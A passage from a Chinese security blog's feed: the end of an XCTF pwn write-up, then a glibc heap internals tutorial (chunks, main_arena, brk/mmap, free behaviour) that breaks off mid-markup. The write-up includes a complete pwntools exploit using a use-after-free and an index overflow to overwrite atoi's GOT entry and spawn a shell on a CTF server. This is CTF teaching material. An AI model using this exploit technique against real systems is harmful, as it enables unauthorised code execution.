esi,0：5字节</li><li>mov edx,0：5字节</li><li>syscall：2字节</li></ul></blockquote><p>      “/bin/sh”的值可以通过程序的输入进行输入，在这里我们用<code>atoi()函数</code>，我们看一下第一次执行<code>atoi函数</code>的汇编：</p><p><img src="/images/137-3.png" alt></p><blockquote><p>通过上图可以看出，如果输入的是&quot;/bin/sh&quot;，汇编代码会自动将其地址放入rdi中，所以无需我们自己再构造指令了。</p></blockquote><h4 id="font-color-blue3确定jmp的距离font"><a class="markdownIt-Anchor" href="#font-color-blue3确定jmp的距离font"></a> <font color="blue"><code>3.确定jmp的距离</code></font></h4><p>      上面已经得到要输入的shellcode了，但是每个chunk中的shellcode怎么连接起来呢？这就需要我们的<code>jmp short</code>指令，这是一个相对近址跳转指令，我们来看看它的原理是什么，如下图：</p><p><img src="/images/137-4.png" alt></p><blockquote><p>如上图，看地址为<code>0xE94</code>和<code>0xEA0</code>处的汇编指令，都是<code>jmp short loc_ED1</code>，那么jmp是怎么跳转到的呢？下面看上图中的右半部分，可以看出地址为<code>0xE94</code>的指令的字节为：<code>EB 3B</code>，而地址<code>0xEA0</code>的指令的字节为：<code>EB 2F</code>，它们都是跳转到地址为<code>ED1</code>处，来计算一下是怎么跳转的：</p><ul><li><code>0xE94</code>：0xe94+0x3b = 0xecf，0xecf+2 = 0xed1</li><li><code>0xEA0</code>：0xea0+0x2f = 0xecf，0xecf+2 = 0xed1</li></ul><p>也就是说要得到目标地址那么就是jmp指令距离函数loc_ED1的距离2F，那么在堆中的跳转距离是多少呢？下面画一个示意图来说明一下，如下图：</p></blockquote><p><img src="/images/137-5.png" alt></p><blockquote><p>由此看来jmp short xxx中的xxx的值是<code>该命令行结束后的地址，即图中的0x1017地址，到要执行命令的起始位置，即图中的0x1030位置</code>，所以我们可以得到jmp结束后的地址到下一个chunk用户数据处的地址的距离为：<code>1+8+8+8 = 25(0x19)</code>，为什么是这样的，可以看上图的实例。</p></blockquote><h4 id="font-color-blue4确定解题思路font"><a class="markdownIt-Anchor" href="#font-color-blue4确定解题思路font"></a> <font color="blue"><code>4.确定解题思路</code></font></h4><blockquote><p>通过上述的分析，我们确定了如下的解题思路：</p><ol><li>将我们的shellcode布置在几个不同的堆块上，如下图：</li></ol><p><img src="/images/137-6.jpg" alt></p><ol start="2"><li>根据上图是可以看到，我们可以通过数组下标溢出，将atoi的got表的值改为我们申请的第一个块的地址，但是如果一开始就修改atoi的got表，那么在后面的程序运行中会出现错误，所以我们在最后修改atoi的got表地址，而且必须放在chunk的最前面，因为这样才能形成一个完整的控制流，那么我们如何操作呢？我们可以利用uaf的技巧，这是因为该程序在释放空间时没有将指针置为NULL，当我们释放了第一个chunk，然后再申请一个相同大小的chunk，进行重复利用，从而修改atoi的got表地址；其他的chunk即按照正常的顺序申请即可，申请流程如下：</li></ol><p><img src="/images/137-7.jpg" alt></p><ol start="3"><li>从上图可以看出，我们就可以写出完整的exp</li></ol></blockquote><h3 id="font-color-navy0x02-完整expfont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-完整expfont"></a> <font color="navy"><code>0x02 完整exp</code></font></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"220.249.52.133"</span>,<span class="number">40709</span>)</span><br><span class="line">context(log_level=<span class="string">"debug"</span>)</span><br><span class="line">elf = ELF(<span class="string">"pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addNote</span><span class="params">(r, index, size, content)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"1"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index:"</span>,index)</span><br><span class="line">r.sendlineafter(<span class="string">"size:"</span>,size)</span><br><span class="line">r.sendafter(<span class="string">"content"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deleteNote</span><span class="params">(r, index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"your choice&gt;&gt; "</span>,<span class="string">"4"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"index"</span>,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addNote(r,<span class="string">"0"</span>,<span class="string">"8"</span>,<span class="string">"a"</span>*<span class="number">7</span>)</span><br><span class="line">addNote(r,<span class="string">"1"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rsi,rsi'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"2"</span>,<span class="string">"8"</span>,asm(<span class="string">'xor rdx,rdx'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\x90\x90\xeb\x19'</span>)</span><br><span class="line">addNote(r,<span class="string">"3"</span>,<span class="string">"8"</span>,str(asm(<span class="string">'syscall'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>),encoding=<span class="string">"unicode_escape"</span>).ljust(<span class="number">7</span>,<span class="string">'\x90'</span>))</span><br><span class="line">addNote(r,<span class="string">"4"</span>,<span class="string">"8"</span>,<span class="string">"/bin/sh"</span>)</span><br><span class="line">deleteNote(r,<span class="string">"0"</span>)</span><br><span class="line"><span class="comment">#addNote(r,str((elf.got["free"]-0x2020A0)//8),"8",asm('xor rax,rax',os="linux",arch="amd64") + b'\x90\x90\xeb\x19')</span></span><br><span class="line"><span class="comment">#addNote(r,"2","8",asm('mov eax,0x3B',os="linux",arch="amd64") + b'\xeb\x19')</span></span><br><span class="line">addNote(r,str((elf.got[<span class="string">"atoi"</span>]<span class="number">-0x2020A0</span>)//<span class="number">8</span>),<span class="string">"8"</span>,asm(<span class="string">'mov eax,0x3B'</span>,os=<span class="string">"linux"</span>,arch=<span class="string">"amd64"</span>) + <span class="string">b'\xeb\x19'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">'your choice&gt;&gt;'</span>,<span class="string">'/bin/sh'</span>)  </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-基础知识font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-基础知识font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 基
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
      <category term="堆相关题目" scheme="https://muzibing.github.io/tags/%E5%A0%86%E7%9B%B8%E5%85%B3%E9%A2%98%E7%9B%AE/"/>
    
  </entry>
  
  <entry>
    <title>由浅入深的剖析堆</title>
    <link href="https://muzibing.github.io/2020/07/13/2020.07.13%EF%BC%88136%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/13/2020.07.13（136）/</id>
    <published>2020-07-12T16:00:00.000Z</published>
    <updated>2020-07-14T15:00:52.603Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>     只要学过C语言的同学想必都申请过堆内存吧，那么大家是否真正了解申请堆和释放堆后面的机制吗？今天我就带领大家一步一步的来了解，先在这里留一个问题：<code>上述代码是否有漏洞？</code>以后会慢慢的揭开这个答案，本文均是在64位下进行的实验。</p><h3 id="font-color-navy0x00-什么是堆font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-什么是堆font"></a> <font color="navy"><code>0x00 什么是堆？</code></font></h3><blockquote><p>在计算机科学中, 动态内存分配（Dynamic memory allocation）又称为堆内存分配，是指计算机程序在运行期中分配使用内存。它可以当成是一种分配有限内存资源所有权的方法。动态分配的内存在被程序员明确释放或被垃圾回收之前一直有效。与静态内存分配的区别在于没有一个固定的生存期。这样被分配的对象称之为有一个“动态生存期”。对堆操作的<strong>是由堆管理器（ptmalloc2）来实现的，而不是操作系统内核</strong>。因为程序每次申请或者释放堆时都需要进行系统调用，系统调用的开销巨大，当频繁进行堆操作时，就会严重影响程序的性能</p></blockquote><p>      简而言之，堆就是程序员动态分配的一个内存空间，它在进程内存中的分布如下：</p><p><img src="/images/136-1.png" alt></p><center><font size="2">图1</font></center><p>      从上图可以看出堆是由<strong>低地址向高地址生长的</strong>，这一点必须要清楚。虽然程序可以请求一块连续内存，并自由地使用，但是还应清楚：<strong>堆在内存空间中不一定连续</strong>。</p><p>      下面我们运行一下上述的代码，在main函数打个断点，当运行完<code>call malloc</code>后，该函数会返回给寄存器<code>eax</code>一个值，这个值就是动态申请的返回的指针<code>ptr</code>。</p><p><img src="/images/136-4.png" alt></p><center><font size="2">图2</font></center><blockquote><p>从上图可以看出返回的地址为<code>0x5555555592a0</code>，对于chunk来说这只是user_content的开始，不是chunk的地址，这块后面会详细讲解。</p></blockquote><p><img src="/images/136-2.png" alt></p><center><font size="2">图3</font></center><blockquote><p>从上图中可以看出，在执行malloc之后在程序的虚拟内存空间中映射了一个heap区域（有关虚拟地址的映射我会在后期在单独写一篇），也就是说这个时候堆已经分配成功了，那么我们计算一下映射的堆的大小是多少：<code>0x000055555557a000- 0x0000555555559000=0x21000（132KB）</code>，下面我们进行验证，看一下堆中的情况，如下图：</p></blockquote><p><img src="/images/136-3.png" alt></p><center><font size="2">图4</font></center><blockquote><p>如上图所示，执行完malloc后会有三个堆块，在这里先不说这些堆块的意义，只是计算一下它们的合计大小：<code>0x290+0x40+0x20d63=0x21000</code>，验证成功。在这里留几个问题：</p><ol><li><font color="green">【图一】返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</font></li><li><font color="green">【图一】我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</font></li><li><font color="green">【图二】我们只申请了大小为50个字节的堆空间，为什么给我们分配了<code>132KB</code>大小的堆空间？</font></li><li><font color="green">【图三】我们只申请了一个堆块，为什么堆空间中有三个堆块？</font></li></ol></blockquote><p>      下面我们还不会讲malloc背后的原理，让我们带着这些问题走进堆的学习。</p><h3 id="font-color-navy0x01-chunk讲解font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-chunk讲解font"></a> <font color="navy"><code>0x01 Chunk讲解</code></font></h3><p>      首先来看chunk的结构，下面给出chunk的源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a "view" into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>从官方给出的源码中可以看出，chunk有两种结构，分别是<code>malloced chunk</code>和<code>freed chunk</code>，下面根据源码中的数据结构给出两种chunk的结构示意图，在这里给出的是64位下的，对齐字节为16字节。</p></blockquote><p><img src="/images/136-5.png" alt></p><center><font size="2">图5</font></center><blockquote><p>注释：</p><ul><li><code>prev_size</code>：当标志位p=0时，表示前面的chunk处于free状态，这时这里表示的是前一个chunk的大小；当p=1时，表示前面的chunk处于malloc状态，这时这里的数据可以被前面的chunk复用，下面会有例子说明；</li><li><code>size</code>：当前整个chunk的大小</li><li><code>user content</code>：用户申请的大小</li><li><code>A/M/P</code>：标志位<ul><li>A：A=0 为主分区（main_arena）分配，A=1 为非主分区分配</li><li>M：M=0为使用heap区域，M=1表示使用mmap映射区域</li><li>P：P=0 表示pre_chunk空闲，mchunk_prev_size才有效，P=1表示pre_chunk在使用中，prev_size被pre_chunk复用</li></ul></li><li><code>fd</code>：前一个堆块的地址（不是返回给用户的地址哦），只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>bk</code>：后一个堆块的地址，只有chunk处于free状态时才有用，否则只是表示用户数据</li><li><code>fd_nextsize</code>： <strong>Only used for large blocks: pointer to next larger size</strong></li><li><code>bk_nextsize</code>：<strong>Only used for large blocks: pointer to prev larger size</strong></li></ul></blockquote><p>      有了上述的知识储备，那么我们就可以来回答第一个问题：<code>返回的chunk指针为0x5555555592a0，为什么在heap看到的起始地址却是0x555555559290？</code>我们从图5中可以看到，我们<strong>申请的堆空间只是user_content部分</strong>，<strong>而chunk真正的起始地址应该是指向prev_size的部分</strong>，所以chunk的起始地址应该为<code>返回给用户的地址-0x10=chunk的起始地址</code>，那么我们也就解决了第1个问题：<code>0x5555555592a0-0x10 = 0x555555559290</code></p><h3 id="font-color-navy0x02-main_arenafont"><a class="markdownIt-Anchor" href="#font-color-navy0x02-main_arenafont"></a> <font color="navy"><code>0x02 main_arena</code></font></h3><p>      这里就是要回答第二个、第三个和第四个问题。在上述例子中，我们申请了50bytes大小的堆，操作系统却给我们申请了132KB大小的堆空间，这是为什么呢？首先在这里先向大家引入一个概念：<code>main_arena</code>，如下图：</p><p><img src="/images/136-6.png" alt></p><center><font size="2">图6</font></center><blockquote><p><code>main_arena</code>是由主线程分配的堆空间，<code>main_arena</code>中含有多个chunk，也就是返回给我们申请的堆的地址。因为132KB远远大于50B，所以如果主线程后续再申请堆空间的话，就会先从这132KB的剩余部分进行申请，直到用完或不够用的时候，再通过增加program break location的方式来增加main arena的大小。同理，当main arena中有过多空闲内存的时候，也会通过减小program break location的方式来缩小main arena的大小。<sup>[1]</sup></p></blockquote><p>      通过上述的介绍，我想<strong>第三个问题已经被解决了</strong>，下面开始第二个问题：<code>我们申请的堆大小为50，为什么分配的堆块确是0x40（64）？</code>通过上图我们可以看出，我们申请的50B大小的chunk，只是user_content部分的大小，所以真正的chunk大小应该是<code>0x8(prev_size)+0x8(size)+50=66Bytes</code>，但是从第2张图片中我们看到系统却只给我们64KB，这是为什么呢？还记得上一节中讲的chunk的标志位吗？当p=1时，则表示pre_chunk在使用中，prev_size被pre_chunk复用，对！这里就是这个意思，也就是说我们申请的堆块有2字节被放在了next chunk的prev_size字段中，下面我们可以写个程序验证一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>      在执行了mecpy函数后，我们看一下堆中的存储情况，因为我们输入的字符串长度为50，正好是我们申请的大小，所以这里没有堆溢出，那么现在预测一下chunk的user_content，应该都是&quot;a&quot;，next_chunk的prev_size部分应该是&quot;b&quot;，如下图：</p><p><img src="/images/136-7.png" alt></p><center><font size="2">图7</font></center><blockquote><p>有关第二个问题，可以这样回答：因为我们申请的是50B大小的chunk，但是实际chunk的大小应该是：<code>用户申请的大小+16+nextchunk可以被复用的部分-prevchunk被复用的部分</code></p></blockquote><p>      下面只有第四个问题没有解决了：<code>我们只申请了一个堆块，为什么堆空间中有三个堆块？</code>在这里需要在main_arena区域中引入两个新的概念：<code>top chunk</code>和（<code>另外一个还没搞明白</code>），如下图：</p><p><img src="/images/136-8.jpg" alt></p><center><font size="2">图8</font></center><blockquote><p>从上图中可以看到，除了用户申请的chunk外的空间，处于高地址部分的为top chunk，该chunk并<strong>不属于任何bin</strong>，而是在系统当前的所有free chunk(无论那种bin)都无法满足用户请求的内存大小的时候，将此chunk当做一个应急消防员，分配给用户使用。如果top chunk的大小比用户请求的大小要大的话，就将该top chunk分作两部分：1）用户请求的chunk；2）剩余的部分成为新的top chunk。否则，就需要扩展heap或分配新的heap了——在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。<sup>[1]</sup></p></blockquote><h3 id="font-color-navy0x03-malloc机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-malloc机制font"></a> <font color="navy"><code>0x03 malloc机制</code></font></h3><p>      在linux平台malloc本质上都是通过系统调用<strong>brk</strong>或者<strong>mmap</strong>实现的，如下图：</p><p><img src="/images/136-9.png" alt></p><center><font size="2">图9</font></center><blockquote><p>从操作系统角度来看，进程分配内存有两种方式，分别由两个系统调用完成：brk和mmap（不考虑共享内存）。</p><p>1、brk是将数据段(.data)的最高地址指针_edata往高地址推；</p><p>2、mmap是在进程的虚拟地址空间中（堆和栈中间，称为文件映射区域的地方）找一块空闲的虚拟内存。</p><pre><code> 这两种方式分配的都是虚拟内存，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。</code></pre><p>在标准C库中，提供了malloc/free函数分配释放内存，这两个函数底层是由brk，mmap，munmap这些系统调用实现的。<sup>[3]</sup></p></blockquote><p><code>brk()函数</code></p><blockquote><p><a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L252" target="_blank" rel="noopener">brk</a>通过增加program break的位置（brk）从内核申请（非零值初始化的）内存。一开始，堆段(heap segment)的起始位置（start_brk）和结束位置(brk)指向同一个位置：</p><ul><li>当ASLR（Address Space Layout Randomization）关闭时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（end_data）。</li><li>当ASLR打开时，<code>start_brk</code>和brk同时指向<code>data/bss</code>段的结束位置（<code>end_data</code>）再加上一个随机的brk偏移。</li></ul><p>上面的进程虚拟内存布局图展示了，start_brk是堆段的开始位置，brk(program break)则是堆段的结束位置。</p><p>malloc小于<code>M_MMAP_THRESHOLD</code>（默认为128KB）的内存<sup>[５]</sup>，使用brk分配内存，将_edata往高地址推(只分配虚拟空间，不对应物理内存(因此没有初始化)，第一次读/写数据时，引起内核缺页中断，内核才分配对应的物理内存，然后虚拟地址空间建立映射关系)，如下图：<sup>[4]</sup></p></blockquote><p><img src="/images/136-10.jpg" alt></p><center><font size="2">图10</font></center><blockquote><ol><li><p>进程启动的时候，其（虚拟）内存空间的初始布局如图10-(1)所示。</p><p>其中，mmap内存映射文件是在堆和栈的中间（<a href="http://xn--libc-2-9v9ii49d.2.93.so" target="_blank" rel="noopener">例如libc-2.2.93.so</a>，其它数据文件等），为了简单起见，省略了内存映射文件。_edata指针（glibc里面定义）指向数据段的最高地址。</p></li><li><p>进程调用**A=malloc(30KB)**以后，内存空间如图10-(2)：</p><ul><li><p>malloc函数会调用brk系统调用，将_edata指针往高地址推30K，就完成虚拟内存分配。</p></li><li><p>你可能会问：只要把_edata+30K就完成内存分配了？</p></li><li><p>事实是这样的，_edata+30K只是完成虚拟地址的分配，<strong>A这块内存现在还是没有物理页与之对应的</strong>，等到进程第一次读写A这块内存的时候，<strong>发生缺页中断，内核才分配A这块内存对应的物理页</strong>。也就是说，如果用malloc分配了A这块内容，然后从来不访问它，那么，A对应的物理页是不会被分配的。</p></li></ul></li><li><p>进程调用B=malloc(40K)以后，内存空间如图10-(3)。</p></li></ol></blockquote><p><code>mmap()函数</code></p><blockquote><p>malloc使用<a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285" target="_blank" rel="noopener">mmap</a>创建一个私有匿名的映射段。这个映射段的主要目的是申请一块（零值初始化的）新内存，这块内存处于栈和堆之间，并且<strong>这块内存只能被调用的这个进程独占使用</strong>。<sup>[4]</sup>当主线程malloc的大小大于128KB时以及子线程在申请动态内存时，会用到mmap来申请。</p></blockquote><p><img src="/images/136-11.png" alt></p><center><font size="2">图11</font></center><blockquote><ol><li><p>进程调用C=malloc(200K)以后，内存空间如图11-(4)：</p><p>默认情况下，malloc函数分配内存，如果请<strong>求内存大于128K</strong>（可由M_MMAP_THRESHOLD选项调节），那就不是去推_edata指针了，而是<strong>利用mmap系统调用，从堆和栈的中间分配一块虚拟内存。</strong></p><p>这样子做主要是因为：<strong>brk分配的内存需要等到高地址内存释放以后才能释放</strong>（例如，在B释放之前，A是不可能释放的，这就是内存碎片产生的原因，什么时候紧缩看下面），而mmap分配的内存可以单独释放。<br>当然，还有其它的好处，也有坏处，再具体下去，有兴趣的同学可以去看glibc里面malloc的代码了。</p></li><li><p>进程调用D=malloc(100K)以后，内存空间如图11-(5)；</p></li><li><p>进程调用<code>free(C)</code>以后，C对应的虚拟内存和物理内存一起释放如图11-(6)。</p></li></ol></blockquote><p><code>总结</code>：</p><ol><li>我们申请动态内存空间，实质上是由brk或mmap函数来完成的</li><li>申请的动态内存空间实质上是Arena区域的一个chunk，并且我们申请的大小只不过是user_content并不是整个chunk的大小</li><li>chunk在使用时和空闲时分别有着对应的状态，两者有着差别</li><li>堆的生长空间是从低地址到高地址</li></ol><h3 id="font-color-navy0x04-free机制font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-free机制font"></a> <font color="navy"><code>0x04 Free机制</code></font></h3><p>      还记得文章开头的程序代码吗？我问了一个问题：<font color="red"><code>程序代码中有什么问题吗？</code> </font>下面就来看看上述代码有没有问题。给我们申请的内存赋值50个字符串后，我们再调用free函数，这个时候看一下chunk中的情况，如下图：</p><p><img src="/images/136-12.png" alt></p><center><font size="2">图12</font></center><blockquote><p>从图中看到，在free之后，chunk的结构发生了变化，但是除了<code>fd</code>和<code>bk</code>部分的数据改变以外，其他的数据并没有发生改变，那么在free之后我们是否能将剩下的数据打印出来呢？下面写个程序验证一下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[*] Before free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br><span class="line">[*] After  free chunk:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb</span><br></pre></td></tr></table></figure><blockquote><p>可以看出虽然我们free了chunk，但是我们仍然可以通过指针来访问chunk上的数据，所以说在free之后，我们一定要将指针置0，如下程序：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ptr;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">50</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(ptr,<span class="string">"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabb"</span>,<span class="number">50</span>);<span class="comment">// 48*"a"+"b"</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Before free chunk:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(ptr);    </span><br><span class="line"><span class="built_in">free</span>(ptr);</span><br><span class="line">ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] After  free chunk:"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(ptr+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 